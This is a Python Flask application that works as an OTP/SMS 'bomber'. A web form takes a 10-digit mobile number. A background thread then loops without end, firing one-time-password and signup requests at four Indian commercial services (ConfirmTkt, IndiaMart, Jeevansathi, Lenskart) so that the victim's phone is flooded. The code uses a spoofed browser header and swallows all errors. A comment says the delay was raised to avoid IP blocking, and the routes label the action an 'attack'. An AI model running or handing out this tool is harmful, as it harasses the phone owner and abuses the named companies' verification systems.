import os
import time
import requests
import threading
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
active_tasks = {}

def send_bomber(mobile):
    count = 1
    session = requests.Session()
    
    # Common Headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json"
    }

    while active_tasks.get(mobile):
        print(f"--- Round {count} for {mobile} ---")
        
        # API 1: ConfirmTkt
        try:
            session.post("https://securedapi.confirmtkt.com/api/platform/register", 
                         json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # API 2: IndiaMart (Example of another source)
        try:
            session.get(f"https://my.indiamart.com/user/sendotp/?mobile={mobile}", timeout=5)
        except: pass

        # API 3: Jeevansathi
        try:
            session.post("https://www.jeevansathi.com/profile/otp_send", 
                         data={"phone": mobile}, timeout=5)
        except: pass

        # API 4: Lenskart
        try:
            session.post("https://api.lenskart.com/v1/user/otp", 
                         json={"phoneNumber": mobile}, timeout=5)
        except: pass

        count += 4
        time.sleep(4) # Gap badha diya hai taaki IP block na ho

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid Number"})
    
    if mobile not in active_tasks or not active_tasks[mobile]:
        active_tasks[mobile] = True
        threading.Thread(target=send_bomber, args=(mobile,)).start()
        return jsonify({"status": "success", "message": "Multi-API Attack Started"})
    return jsonify({"status": "info", "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    active_tasks[mobile] = False
    return jsonify({"status": "success", "message": "Attack Stopped"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
